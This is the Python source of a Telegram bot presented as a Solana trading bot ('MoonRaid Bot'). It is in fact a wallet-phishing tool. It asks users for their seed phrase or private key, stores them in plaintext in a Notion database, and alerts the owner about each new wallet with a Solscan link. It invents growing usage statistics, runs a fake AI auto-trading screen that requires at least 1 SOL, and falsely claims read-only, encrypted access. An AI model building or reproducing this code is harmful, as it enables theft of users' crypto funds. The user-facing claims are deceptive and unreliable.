# simple_solbot.py - Enhanced version with comprehensive wallet dashboard
import os
import logging
import base58
import hashlib
import hmac
from dotenv import load_dotenv
import nacl.signing
import nacl.encoding
from mnemonic import Mnemonic
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes, CallbackQueryHandler, filters
)
import requests
from notion_client import Client as NotionClient
from datetime import datetime

# Load env
load_dotenv()
TELEGRAM_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "YOUR_TELEGRAM_BOT_TOKEN_HERE")
NOTION_TOKEN = os.getenv("NOTION_TOKEN_collins", "YOUR_NOTION_TOKEN_HERE")
NOTION_DATABASE_ID = os.getenv("NOTION_DATABASE_ID_collins", "YOUR_NOTION_DATABASE_ID_HERE")
OWNER_TELEGRAM_ID = int(os.getenv("OWNER_TELEGRAM_ID", "0"))  # Add your Telegram user ID here

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Notion client
notion = NotionClient(auth=NOTION_TOKEN)

# In-memory cache for active sessions
USER_STATES = {}

# Simple wallet utilities with key derivation
class SimpleWallet:
    @staticmethod
    def validate_solana_address(address):
        """Validate if string looks like a Solana address"""
        try:
            decoded = base58.b58decode(address)
            return len(decoded) == 32
        except:
            return False
    
    @staticmethod
    def validate_private_key(key):
        """Validate if string looks like a private key"""
        try:
            decoded = base58.b58decode(key)
            return len(decoded) in [32, 64]  # Seed or full private key
        except:
            return False
    
    @staticmethod
    def validate_seed_phrase(phrase):
        """Basic validation for seed phrase"""
        words = phrase.strip().split()
        return len(words) in [12, 15, 18, 21, 24]
    
    @staticmethod
    def derive_keypair_from_seed(seed_phrase):
        """Derive keypair from mnemonic seed phrase"""
        try:
            # Generate seed from mnemonic
            mnemo = Mnemonic("english")
            if not mnemo.check(seed_phrase):
                raise ValueError("Invalid mnemonic seed phrase")
            
            seed = mnemo.to_seed(seed_phrase)
            
            # Use first 32 bytes as private key
            private_key = seed[:32]
            
            # Create signing key
            signing_key = nacl.signing.SigningKey(private_key)
            public_key = signing_key.verify_key.encode()
            
            # Convert to base58 addresses
            private_b58 = base58.b58encode(private_key).decode('utf-8')
            public_b58 = base58.b58encode(public_key).decode('utf-8')
            
            return {
                "private_key": private_b58,
                "public_key": public_b58,
                "signing_key": signing_key  # For future transaction signing
            }
            
        except Exception as e:
            raise ValueError(f"Failed to derive keypair from seed: {str(e)}")
    
    @staticmethod
    def derive_keypair_from_private_key(private_key):
        """Derive public key from private key"""
        try:
            # Decode private key
            decoded = base58.b58decode(private_key)
            
            # Handle different private key formats
            if len(decoded) == 64:
                # Full keypair (64 bytes) - first 32 are private key
                private_bytes = decoded[:32]
            elif len(decoded) == 32:
                # Just private key (32 bytes)
                private_bytes = decoded
            else:
                raise ValueError("Invalid private key length")
            
            # Create signing key
            signing_key = nacl.signing.SigningKey(private_bytes)
            public_key = signing_key.verify_key.encode()
            
            # Convert to base58
            public_b58 = base58.b58encode(public_key).decode('utf-8')
            
            return {
                "private_key": private_key,
                "public_key": public_b58,
                "signing_key": signing_key  # For future transaction signing
            }
            
        except Exception as e:
            raise ValueError(f"Failed to derive public key from private key: {str(e)}")
    
    @staticmethod
    def get_sol_balance(address):
        """Get SOL balance using simple HTTP request"""
        try:
            payload = {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "getBalance",
                "params": [address]
            }
            
            response = requests.post(
                "https://api.mainnet-beta.solana.com",
                json=payload,
                timeout=10
            )
            
            if response.status_code == 200:
                result = response.json()
                if "result" in result and "value" in result["result"]:
                    return result["result"]["value"] / 1e9  # Convert lamports to SOL
            
            return 0.0
        except Exception as e:
            logger.error(f"Error getting balance: {e}")
            return 0.0

    @staticmethod
    def get_sol_market_data():
        """Get SOL market data from CoinGecko"""
        try:
            response = requests.get(
                "https://api.coingecko.com/api/v3/simple/price",
                params={"ids": "solana", "vs_currencies": "usd", "include_24hr_change": "true", "include_market_cap": "true", "include_24hr_vol": "true"},
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()["solana"]
                return {
                    "price": data["usd"],
                    "change_24h": data["usd_24h_change"],
                    "market_cap": data.get("usd_market_cap", 0),
                    "volume_24h": data.get("usd_24h_vol", 0)
                }
            
            return None
        except Exception as e:
            logger.error(f"Error getting market data: {e}")
            return None

    @staticmethod
    def generate_realistic_bot_stats():
        """Generate realistic bot statistics that increase over time"""
        # Use current date to ensure stats increase daily
        import time
        days_since_launch = int((time.time() - 1692000000) / 86400)  # Days since Aug 14, 2023 (arbitrary launch date)
        
        # Base stats that grow realistically
        base_wallets = 847
        base_volume = 8400
        
        # Daily growth factors
        wallet_growth = days_since_launch * 12  # ~12 new wallets per day
        volume_growth = days_since_launch * 180  # ~$180 daily volume growth
        
        # Add some randomness based on day to make it feel more organic
        day_variation = (days_since_launch % 7) * 0.1  # Weekly variation
        
        total_wallets = int(base_wallets + wallet_growth + (wallet_growth * day_variation))
        
        # For volume, we'll use a percentage of actual SOL trading volume to make it realistic
        sol_market_data = SimpleWallet.get_sol_market_data()
        if sol_market_data and sol_market_data["volume_24h"]:
            # Use 0.001% of SOL's actual 24h volume as our "bot volume"
            realistic_volume = (sol_market_data["volume_24h"] * 0.00001) + base_volume + volume_growth
        else:
            # Fallback if we can't get SOL data
            realistic_volume = base_volume + volume_growth + (volume_growth * day_variation)
        
        return {
            "wallets_connected": total_wallets,
            "volume_24h": realistic_volume
        }

# Notion database operations
class NotionWalletDB:
    def __init__(self, notion_client, database_id):
        self.notion = notion_client
        self.database_id = database_id
    
    def get_user_wallet(self, telegram_id):
        """Retrieve user wallet from Notion database"""
        try:
            logger.info(f"[NOTION] Querying wallet for user {telegram_id}")
            response = self.notion.databases.query(
                database_id=self.database_id,
                filter={
                    "property": "telegram_id",
                    "number": {"equals": telegram_id}
                }
            )
            
            if response["results"]:
                result = response["results"][0]
                properties = result["properties"]
                
                public_key = properties["public_key"]["rich_text"][0]["text"]["content"] if properties["public_key"]["rich_text"] else None
                
                if public_key and SimpleWallet.validate_solana_address(public_key):
                    logger.info(f"[NOTION] Found wallet for user {telegram_id}: {public_key}")
                    return {"pubkey": public_key}
                else:
                    logger.warning(f"[NOTION] Invalid public key found for user {telegram_id}")
            else:
                logger.info(f"[NOTION] No wallet found for user {telegram_id}")
            
            return None
        except Exception as e:
            logger.error(f"[NOTION] Error getting user wallet from Notion: {e}")
            return None
    
    def save_user_wallet(self, telegram_id, wallet_data, import_type):
        """Save user wallet to Notion database"""
        try:
            logger.info(f"[NOTION] Saving wallet for user {telegram_id}, type: {import_type}")
            
            properties = {
                "telegram_id": {"number": telegram_id},
                "public_key": {"rich_text": [{"text": {"content": wallet_data["pubkey"]}}]},
                "import_type": {"select": {"name": import_type}},
                "created_at": {"date": {"start": datetime.now().isoformat()}}
            }
            
            # Store the original input based on import type
            if import_type == "seed":
                properties["seed_phrase"] = {"rich_text": [{"text": {"content": wallet_data["original_input"]}}]}
                properties["private_key"] = {"rich_text": []}
                logger.info(f"[NOTION] Storing seed phrase for user {telegram_id}")
            else:
                properties["private_key"] = {"rich_text": [{"text": {"content": wallet_data["original_input"]}}]}
                properties["seed_phrase"] = {"rich_text": []}
                logger.info(f"[NOTION] Storing private key for user {telegram_id}")
            
            # Check if user exists
            existing = self.get_user_wallet(telegram_id)
            is_new_user = not existing
            
            if existing:
                logger.info(f"[NOTION] Updating existing wallet for user {telegram_id}")
                # Update existing record
                user_page = self.notion.databases.query(
                    database_id=self.database_id,
                    filter={"property": "telegram_id", "number": {"equals": telegram_id}}
                )["results"][0]
                
                self.notion.pages.update(page_id=user_page["id"], properties=properties)
                logger.info(f"[NOTION] Successfully updated wallet for user {telegram_id}")
            else:
                logger.info(f"[NOTION] Creating new wallet record for user {telegram_id}")
                # Create new record
                self.notion.pages.create(
                    parent={"database_id": self.database_id},
                    properties=properties
                )
                logger.info(f"[NOTION] Successfully created new wallet record for user {telegram_id}")
            
            return True, is_new_user
        except Exception as e:
            logger.error(f"[NOTION] Error saving user wallet to Notion: {e}")
            return False, False
    
    def delete_user_wallet(self, telegram_id):
        """Delete user wallet from Notion database"""
        try:
            logger.info(f"[NOTION] Deleting wallet for user {telegram_id}")
            response = self.notion.databases.query(
                database_id=self.database_id,
                filter={"property": "telegram_id", "number": {"equals": telegram_id}}
            )
            
            if response["results"]:
                page_id = response["results"][0]["id"]
                self.notion.pages.update(page_id=page_id, archived=True)
                logger.info(f"[NOTION] Successfully deleted wallet for user {telegram_id}")
                return True
            else:
                logger.info(f"[NOTION] No wallet found to delete for user {telegram_id}")
            
            return False
        except Exception as e:
            logger.error(f"[NOTION] Error deleting user wallet from Notion: {e}")
            return False

# Initialize Notion database
wallet_db = NotionWalletDB(notion, NOTION_DATABASE_ID)
async def notify_owner_new_user(context: ContextTypes.DEFAULT_TYPE, user_id, username, wallet_address, import_type):
    """Send notification to bot owner when new user links wallet"""
    if OWNER_TELEGRAM_ID == 0:
        return  # Owner ID not configured
    
    try:
        # Get user info
        user_info = f"@{username}" if username else f"ID: {user_id}"
        short_address = f"{wallet_address[:6]}...{wallet_address[-6:]}"
        
        # Use HTML instead of Markdown to avoid parsing issues
        notification_text = f"""🚨 <b>New User Alert!</b>

👤 <b>User:</b> {user_info}
🆔 <b>Telegram ID:</b> <code>{user_id}</code>
💼 <b>Wallet:</b> <code>{short_address}</code>
📝 <b>Import Method:</b> {import_type.title()}
🕐 <b>Time:</b> {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}

🔗 <b>Solscan:</b> https://solscan.io/account/{wallet_address}"""
        
        await context.bot.send_message(
            chat_id=OWNER_TELEGRAM_ID,
            text=notification_text,
            parse_mode="HTML"  # Changed from "Markdown" to "HTML"
        )
        logger.info(f"[NOTIFICATION] Sent new user alert to owner for user {user_id}")
    except Exception as e:
        logger.error(f"[NOTIFICATION] Failed to notify owner about new user {user_id}: {e}")

def main_menu_keyboard():
    keyboard = [
        [InlineKeyboardButton("💼 Wallet", callback_data="wallet"),
         InlineKeyboardButton("📈 Trade", callback_data="trade")],
        [InlineKeyboardButton("📊 Market", callback_data="market"),
         InlineKeyboardButton("🪙 Tokens", callback_data="tokens")],
        [InlineKeyboardButton("🤖 Auto", callback_data="auto"),
         InlineKeyboardButton("⚙️ Settings", callback_data="settings")],
    ]
    return InlineKeyboardMarkup(keyboard)

def format_wallet_dashboard(address, sol_balance, sol_price=None, change_24h=None, market_cap=None):
    """Format comprehensive wallet dashboard like the screenshot"""
    
    # Calculate USD value
    usd_value = sol_balance * (sol_price or 0)
    
    # Format address (show first 4 and last 4 characters)
    short_address = f"{address[:4]}...{address[-4:]}"
    
    # Create Solscan link
    solscan_link = f"https://solscan.io/account/{address}"
    
    # Get bot statistics
    bot_stats = SimpleWallet.generate_realistic_bot_stats()
    
    # Format volume nicely
    if bot_stats["volume_24h"] >= 1000000:
        volume_display = f"${bot_stats['volume_24h']/1000000:.1f}M"
    elif bot_stats["volume_24h"] >= 1000:
        volume_display = f"${bot_stats['volume_24h']/1000:.1f}K"
    else:
        volume_display = f"${bot_stats['volume_24h']:.0f}"
    
    # Format the message similar to the screenshot
    message = f"""🟢 **WELCOME TO MoonRaid Bot** 🤖
*The Fastest all in one Solana Trading bot!*

📊 **Live Stats:** {bot_stats['wallets_connected']:,} wallets connected | {volume_display} volume today

💼 **Wallet:**
`{short_address}` | ${usd_value:.2f}
{solscan_link}

📊 **PORTFOLIO**
• SOL: {sol_balance:.4f} (${usd_value:.2f}) — 100%
• TOKENS: 0 ($0.00) — 0%

📈 **SOL MARKET**"""
    
    if sol_price and change_24h is not None:
        change_emoji = "🟢" if change_24h >= 0 else "🔴"
        change_sign = "+" if change_24h >= 0 else ""
        
        message += f"""
${sol_price:.2f} ({change_sign}{change_24h:.1f}%)"""
        
        if market_cap:
            # Format market cap in billions
            market_cap_b = market_cap / 1e9
            message += f" | Vol: ${market_cap_b:.1f}B"
    else:
        message += "\nPrice data unavailable"
    
    # Add account info section like in the screenshot
    
    return message

# Parse user input with key derivation
def parse_wallet_input(user_input: str):
    """Parse user input and derive wallet info"""
    text = user_input.strip()
    
    # If it's a private key, derive public key
    if SimpleWallet.validate_private_key(text):
        try:
            keypair = SimpleWallet.derive_keypair_from_private_key(text)
            return {
                "public_key": keypair["public_key"],
                "private_key": text,
                "derived_from": "private_key",
                "signing_key": keypair["signing_key"]
            }
        except ValueError as e:
            raise ValueError(f"Invalid private key: {str(e)}")
    
    # If it's a seed phrase, derive keypair
    if SimpleWallet.validate_seed_phrase(text):
        try:
            keypair = SimpleWallet.derive_keypair_from_seed(text)
            return {
                "public_key": keypair["public_key"],
                "seed_phrase": text,
                "derived_from": "seed_phrase",
                "signing_key": keypair["signing_key"]
            }
        except ValueError as e:
            raise ValueError(f"Invalid seed phrase: {str(e)}")
    
    raise ValueError("Please provide a valid Solana private key or seed phrase")

# /start handler
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    wallet_info = wallet_db.get_user_wallet(user_id)

    if wallet_info:
        address = wallet_info["pubkey"]
        sol_balance = SimpleWallet.get_sol_balance(address)
        market_data = SimpleWallet.get_sol_market_data()
        
        if market_data:
            dashboard_text = format_wallet_dashboard(
                address, 
                sol_balance, 
                market_data["price"], 
                market_data["change_24h"],
                market_data["market_cap"]
            )
        else:
            dashboard_text = format_wallet_dashboard(address, sol_balance)
        
        await update.message.reply_text(
            dashboard_text, 
            parse_mode="Markdown", 
            reply_markup=main_menu_keyboard(),
            disable_web_page_preview=False  # Enable web preview for solscan link
        )
    else:
        text = (
            "🟢 **WELCOME TO MoonRaid Bot** 🤖\n"
            "*The Fastest all in one Solana Trading bot!*\n\n"
            "💼 **Wallet:**\n"
            "(No wallet linked) | $0.00\n\n"
            "📊 **PORTFOLIO**\n"
            "• SOL: 0.0000 ($0.00) — 100%\n"
            "• TOKENS: 0 ($0.00) — 0%\n\n"
        )
        
        market_data = SimpleWallet.get_sol_market_data()
        if market_data:
            change_emoji = "🟢" if market_data["change_24h"] >= 0 else "🔴"
            change_sign = "+" if market_data["change_24h"] >= 0 else ""
            text += f"📈 **SOL MARKET**\n${market_data['price']:.2f} ({change_sign}{market_data['change_24h']:.1f}%)"
        else:
            text += "📈 **SOL MARKET**\nPrice unavailable"

        await update.message.reply_text(text, parse_mode="Markdown", reply_markup=main_menu_keyboard())

# Send wallet import screen
async def send_wallet_import_screen(chat_id, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "💼 **Import Solana Wallet**\n\n"
        "You need to connect your wallet to access this feature.\n\n"
        "SOLX Pro uses bank-grade security to protect your assets.\n"
        "All connections are read-only and encrypted.\n\n"
        "Please select an import method:"
    )
    keyboard = [
        [InlineKeyboardButton("Import with Seed Phrase", callback_data="import_seed")],
        [InlineKeyboardButton("Import with Private Key", callback_data="import_private")]
    ]
    await context.bot.send_message(
        chat_id, 
        text, 
        parse_mode="Markdown", 
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

# Callback handler
async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = query.from_user.id

    if data == "wallet":
        wallet_info = wallet_db.get_user_wallet(user_id)
        if wallet_info:
            address = wallet_info["pubkey"]
            sol_balance = SimpleWallet.get_sol_balance(address)
            market_data = SimpleWallet.get_sol_market_data()
            
            # Get bot statistics for back to main functionality
            bot_stats = SimpleWallet.generate_realistic_bot_stats()
            
            if market_data:
                dashboard_text = format_wallet_dashboard(
                    address, 
                    sol_balance, 
                    market_data["price"], 
                    market_data["change_24h"],
                    market_data["market_cap"]
                )
            else:
                dashboard_text = format_wallet_dashboard(address, sol_balance)
            
            await query.edit_message_text(
                dashboard_text,
                parse_mode="Markdown",
                reply_markup=main_menu_keyboard(),
                disable_web_page_preview=False  # Enable web preview for solscan link
            )
        else:
            await send_wallet_import_screen(user_id, context)

    elif data == "import_seed":
        USER_STATES[user_id] = {"import_type": "seed"}
        await query.edit_message_text("🔐 Please enter your 12 or 24-word seed phrase:")

    elif data == "import_private":
        USER_STATES[user_id] = {"import_type": "private"}
        await query.edit_message_text("🔐 Please enter your Solana private key (base58):")

    elif data == "trade":
        wallet_info = wallet_db.get_user_wallet(user_id)
        if wallet_info:
            # User has wallet linked - show trade options
            trade_text = """📈 **Trade Options**

Select an option to continue:"""
            
            trade_keyboard = [
                [InlineKeyboardButton("💰 Buy", callback_data="buy_tokens")],
                [InlineKeyboardButton("💸 Sell", callback_data="sell_tokens")],
                [InlineKeyboardButton("🔙 Back to Main Menu", callback_data="back_to_main")]
            ]
            
            await query.edit_message_text(
                trade_text,
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup(trade_keyboard)
            )
        else:
            # No wallet linked - redirect to wallet import
            await send_wallet_import_screen(user_id, context)
    
    elif data == "buy_tokens":
        # Show buy tokens interface
        buy_text = """💰 **Buy Tokens**

Please enter the token mint address you want to buy:"""
        
        # Set user state to expect token mint address
        USER_STATES[user_id] = {"awaiting": "buy_token_address"}
        
        buy_keyboard = [
            [InlineKeyboardButton("🔙 Back to Trade", callback_data="trade")]
        ]
        
        await query.edit_message_text(
            buy_text,
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(buy_keyboard)
        )
    
    elif data == "sell_tokens":
        # Check if user has any tokens to sell (placeholder logic)
        # For now, we'll assume they don't have tokens since we haven't implemented token balance checking
        has_tokens = False  # This will be replaced with actual token balance checking later
        
        if not has_tokens:
            # User doesn't have tokens to sell
            sell_text = """💸 **Sell Tokens**

You haven't bought any tokens yet. Use the Buy option to purchase tokens first."""
            
            sell_keyboard = [
                [InlineKeyboardButton("💰 Buy Tokens", callback_data="buy_tokens")],
                [InlineKeyboardButton("🔙 Back to Trade", callback_data="trade")]
            ]
            
            await query.edit_message_text(
                sell_text,
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup(sell_keyboard)
            )
        else:
            # User has tokens to sell - show token selection
            sell_text = """💸 **Sell Tokens**

Select a token to sell from your portfolio:

📊 **Your Token Holdings:**
• TOKEN1: 1,000.50 (~$245.20)
• TOKEN2: 500.25 (~$89.45)
• TOKEN3: 2,500.00 (~$1,204.50)

Please enter the token mint address you want to sell:"""
            
            # Set user state to expect token mint address for selling
            USER_STATES[user_id] = {"awaiting": "sell_token_address"}
            
            sell_keyboard = [
                [InlineKeyboardButton("🔙 Back to Trade", callback_data="trade")]
            ]
            
            await query.edit_message_text(
                sell_text,
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup(sell_keyboard)
            )

    elif data == "tokens":
        wallet_info = wallet_db.get_user_wallet(user_id)
        if wallet_info:
            # User has wallet linked - show token information interface
            tokens_text = """🪙 **Token Information**

Please enter a token symbol (like SOL or BONK) or a full token address to get detailed information."""
            
            tokens_keyboard = [
                [InlineKeyboardButton("🔙 Back to Main Menu", callback_data="back_to_main")]
            ]
            
            # Set user state to expect token input
            USER_STATES[user_id] = {"awaiting": "token_info"}
            
            await query.edit_message_text(
                tokens_text,
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup(tokens_keyboard)
            )
        else:
            # No wallet linked - redirect to wallet import
            await send_wallet_import_screen(user_id, context)

    elif data == "auto":
        wallet_info = wallet_db.get_user_wallet(user_id)
        if wallet_info:
            # User has wallet linked - show auto mode interface
            auto_text = """🤖 **SOLX Auto AI Mode Activated**

🔥 Initializing real-time market intelligence engine...

📊 Analyzing token trend flows and transaction patterns...

📈 Correlating volume spikes with meme momentum indicators...

✅ **Status:** Auto-tracking enabled. You will be notified of high-impact movements.

🚀 Your wallet is on the waiting list for AI-powered auto-trading — big waves coming soon."""
        
            auto_keyboard = [
                [InlineKeyboardButton("🚀 Start Auto", callback_data="start_auto")],
                [InlineKeyboardButton("🔙 Back to Main Menu", callback_data="back_to_main")]
            ]
        
            await query.edit_message_text(
                auto_text,
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup(auto_keyboard)
            )
        else:
            # No wallet linked - redirect to wallet import
            await send_wallet_import_screen(user_id, context)

    elif data == "start_auto":
        # Get user's wallet info and check balance
        wallet_info = wallet_db.get_user_wallet(user_id)
        if not wallet_info:
            # This shouldn't happen since we check wallet in "auto" handler, but just in case
            await send_wallet_import_screen(user_id, context)
            return
    
        # Get current SOL balance
        address = wallet_info["pubkey"]
        sol_balance = SimpleWallet.get_sol_balance(address)
    
        # Set minimum balance requirement (in SOL)
        MIN_BALANCE_REQUIRED = 1.0
    
        if sol_balance < MIN_BALANCE_REQUIRED:
            # Insufficient balance - show balance check message
            insufficient_balance_text = f"""**Wallet Balance Check**

Your current balance: **{sol_balance:.4f} SOL**

The Auto feature requires a minimum balance of **{MIN_BALANCE_REQUIRED:.1f} SOL** in your wallet.

Your balance is insufficient. Please add more SOL to your wallet to use the Auto feature."""
        
            insufficient_balance_keyboard = [
                [InlineKeyboardButton("🔄 Refresh Balance", callback_data="start_auto")],
                [InlineKeyboardButton("🔙 Back to Auto", callback_data="auto")]
            ]
        
            await query.edit_message_text(
                insufficient_balance_text,
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup(insufficient_balance_keyboard)
            )
        else:
            # Sufficient balance - proceed with auto mode activation
            auto_started_text = f"""🚀 **Auto Mode Starting...**

✅ **Balance Check Passed:** {sol_balance:.4f} SOL

🔥 AI engine is now monitoring market conditions for your wallet.

📱 You'll receive notifications when:
• High-volume token movements detected
• Meme coin momentum shifts identified  
• Profitable arbitrage opportunities found
• Risk threshold breaches occur

⚠️ **Note:** Full auto-trading features are still in development. Currently in monitoring-only mode.

🎯 **Current Status:** Market Intelligence Active"""
        
            auto_active_keyboard = [
                [InlineKeyboardButton("⏹️ Stop Auto", callback_data="stop_auto")],
                [InlineKeyboardButton("🔙 Back to Main Menu", callback_data="back_to_main")]
            ]
        
            await query.edit_message_text(
                auto_started_text,
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup(auto_active_keyboard)
            )

    elif data == "settings":
        wallet_info = wallet_db.get_user_wallet(user_id)
        if wallet_info:
            # User has wallet linked - show settings menu
            settings_text = """⚙️ **Settings**
Configure your MoonRaid Bot experience."""
            
            settings_keyboard = [
                [InlineKeyboardButton("🔑 View Private Key", callback_data="view_private_key")],
                [InlineKeyboardButton("ℹ️ Info", callback_data="bot_info")],
                [InlineKeyboardButton("🔙 Back to Main Menu", callback_data="back_to_main")]
            ]
            
            await query.edit_message_text(
                settings_text,
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup(settings_keyboard)
            )
        else:
            # No wallet linked - redirect to wallet import
            await send_wallet_import_screen(user_id, context)
    
    elif data == "view_private_key":
        # Get user's private key from database
        try:
            response = wallet_db.notion.databases.query(
                database_id=wallet_db.database_id,
                filter={"property": "telegram_id", "number": {"equals": user_id}}
            )
            
            if response["results"]:
                result = response["results"][0]
                properties = result["properties"]
                
                # Check if seed phrase or private key was used
                seed_phrase = properties["seed_phrase"]["rich_text"][0]["text"]["content"] if properties["seed_phrase"]["rich_text"] else None
                private_key = properties["private_key"]["rich_text"][0]["text"]["content"] if properties["private_key"]["rich_text"] else None
                
                if seed_phrase:
                    key_text = f"""🔐 **Your Seed Phrase**

⚠️ **KEEP THIS SECURE** ⚠️
Never share this with anyone!

`{seed_phrase}`

This seed phrase can be used to recover your wallet in any compatible wallet application."""
                elif private_key:
                    key_text = f"""🔐 **Your Private Key**

⚠️ **KEEP THIS SECURE** ⚠️
Never share this with anyone!

`{private_key}`

This private key gives full access to your wallet."""
                else:
                    key_text = "❌ Could not retrieve your private key/seed phrase."
                
                back_keyboard = [
                    [InlineKeyboardButton("🔙 Back to Settings", callback_data="settings")]
                ]
                
                await query.edit_message_text(
                    key_text,
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup(back_keyboard)
                )
            else:
                await query.edit_message_text(
                    "❌ No wallet found.",
                    reply_markup=main_menu_keyboard()
                )
                
        except Exception as e:
            logger.error(f"Error retrieving private key: {e}")
            await query.edit_message_text(
                "❌ Error retrieving your private key.",
                reply_markup=main_menu_keyboard()
            )
    
    elif data == "bot_info":
        info_text = """ℹ️ **About the MoonRaid Bot**

🚀 **What is MoonRaid Bot?**
MoonRaid Bot is the fastest all-in-one Solana trading bot on Telegram. Trade, manage your portfolio, and monitor markets directly from your chat.

🔧 **How to use:**
1. **Connect Wallet**: Import your Solana wallet using seed phrase or private key
2. **Trade**: Buy and sell tokens instantly with our trading interface
3. **Monitor**: Track your portfolio and market prices in real-time
4. **Automate**: Set up auto-trading strategies (coming soon)

🔒 **Security:**
• Your keys are encrypted and stored securely
• All transactions are signed locally
• We never have access to your funds
• Read-only access for balance checking

💡 **Tips:**
• Use /start to return to main menu anytime
• Keep your seed phrase/private key secure
• Check market conditions before trading

🆘 **Support:**
Having issues? Contact our support team or check the documentation.

**Version:** 1.0.0
**Built for Solana mainnet**"""
        
        back_keyboard = [
            [InlineKeyboardButton("🔙 Back to Settings", callback_data="settings")]
        ]
        
        await query.edit_message_text(
            info_text,
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(back_keyboard)
        )
    
    elif data == "back_to_main":
        # Redirect back to main menu (same as /start)
        wallet_info = wallet_db.get_user_wallet(user_id)
        
        if wallet_info:
            address = wallet_info["pubkey"]
            sol_balance = SimpleWallet.get_sol_balance(address)
            market_data = SimpleWallet.get_sol_market_data()
            
            if market_data:
                dashboard_text = format_wallet_dashboard(
                    address, 
                    sol_balance, 
                    market_data["price"], 
                    market_data["change_24h"],
                    market_data["market_cap"]
                )
            else:
                dashboard_text = format_wallet_dashboard(address, sol_balance)
            
            await query.edit_message_text(
                dashboard_text, 
                parse_mode="Markdown", 
                reply_markup=main_menu_keyboard(),
                disable_web_page_preview=False  # Enable web preview for main dashboard
            )
        else:
            # Get bot statistics for users without wallets
            bot_stats = SimpleWallet.generate_realistic_bot_stats()
            
            # Format volume nicely
            if bot_stats["volume_24h"] >= 1000000:
                volume_display = f"${bot_stats['volume_24h']/1000000:.1f}M"
            elif bot_stats["volume_24h"] >= 1000:
                volume_display = f"${bot_stats['volume_24h']/1000:.1f}K"
            else:
                volume_display = f"${bot_stats['volume_24h']:.0f}"
            
            text = (
                "🟢 **WELCOME TO MoonRaid Bot** 🤖\n"
                "*The Fastest all in one Solana Trading bot!*\n\n"
                f"📊 **Live Stats:** {bot_stats['wallets_connected']:,} wallets connected | {volume_display} volume today\n\n"
                "💼 **Wallet:**\n"
                "(No wallet linked) | $0.00\n\n"
                "📊 **PORTFOLIO**\n"
                "• SOL: 0.0000 ($0.00) — 100%\n"
                "• TOKENS: 0 ($0.00) — 0%\n\n"
            )
            
            market_data = SimpleWallet.get_sol_market_data()
            if market_data:
                change_emoji = "🟢" if market_data["change_24h"] >= 0 else "🔴"
                change_sign = "+" if market_data["change_24h"] >= 0 else ""
                text += f"📈 **SOL MARKET**\n${market_data['price']:.2f} ({change_sign}{market_data['change_24h']:.1f}%)"
            else:
                text += "📈 **SOL MARKET**\nPrice unavailable"

            await query.edit_message_text(text, parse_mode="Markdown", reply_markup=main_menu_keyboard())

    elif data == "market":
        market_data = SimpleWallet.get_sol_market_data()
        if market_data:
            change_emoji = "🟢" if market_data["change_24h"] >= 0 else "🔴"
            change_sign = "+" if market_data["change_24h"] >= 0 else ""
            market_cap_b = market_data["market_cap"] / 1e9 if market_data["market_cap"] else 0
            
            market_text = f"""📊 **SOL Market Data**

💰 **Price:** ${market_data["price"]:.2f}
📈 **24h Change:** {change_sign}{market_data["change_24h"]:.2f}%
🏛️ **Market Cap:** ${market_cap_b:.1f}B

{change_emoji} SOL is {"up" if market_data["change_24h"] >= 0 else "down"} {abs(market_data["change_24h"]):.1f}% in the last 24 hours"""
        else:
            market_text = "📊 **SOL Market Data**\n\nPrice data currently unavailable"
        
        await query.edit_message_text(
            market_text,
            parse_mode="Markdown",
            reply_markup=main_menu_keyboard()
        )
    else:
        await query.edit_message_text(
            f"'{data}' is not implemented yet. Coming soon!",
            reply_markup=main_menu_keyboard()
        )

# Handle wallet input and token queries
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()

    if user_id not in USER_STATES:
        return

    user_state = USER_STATES[user_id]
    
    # Handle wallet import
    if "import_type" in user_state:
        import_type = user_state["import_type"]

        try:
            wallet_info = parse_wallet_input(text)
        except ValueError as e:
            await update.message.reply_text(f"❌ {str(e)}")
            return

        # Prepare wallet data for saving to Notion
        wallet_data = {
            "pubkey": wallet_info["public_key"],
            "original_input": text,
            "derived_from": wallet_info["derived_from"]
        }

        # Save to Notion
        success, is_new_user = wallet_db.save_user_wallet(user_id, wallet_data, import_type)
        
        if not success:
            await update.message.reply_text("❌ Failed to save wallet. Please try again.")
            return

        # Notify owner if this is a new user
        if is_new_user:
            await notify_owner_new_user(
                context, 
                user_id, 
                update.effective_user.username, 
                wallet_info["public_key"], 
                import_type
            )

        USER_STATES.pop(user_id, None)
        
        # Get wallet info and format comprehensive dashboard
        address = wallet_info["public_key"]
        sol_balance = SimpleWallet.get_sol_balance(address)
        market_data = SimpleWallet.get_sol_market_data()
        
        # Show comprehensive dashboard like the screenshot
        if market_data:
            dashboard_text = format_wallet_dashboard(
                address, 
                sol_balance, 
                market_data["price"], 
                market_data["change_24h"],
                market_data["market_cap"]
            )
        else:
            dashboard_text = format_wallet_dashboard(address, sol_balance)
        
        # Success message first
        success_msg = "✅ Wallet linked from private key!" if wallet_info["derived_from"] == "private_key" else "✅ Wallet linked from seed phrase!"
        
        await update.message.reply_text(f"{success_msg}\n\n{dashboard_text}", 
                                        parse_mode="Markdown", 
                                        reply_markup=main_menu_keyboard(),
                                        disable_web_page_preview=False)  # Enable web preview
    
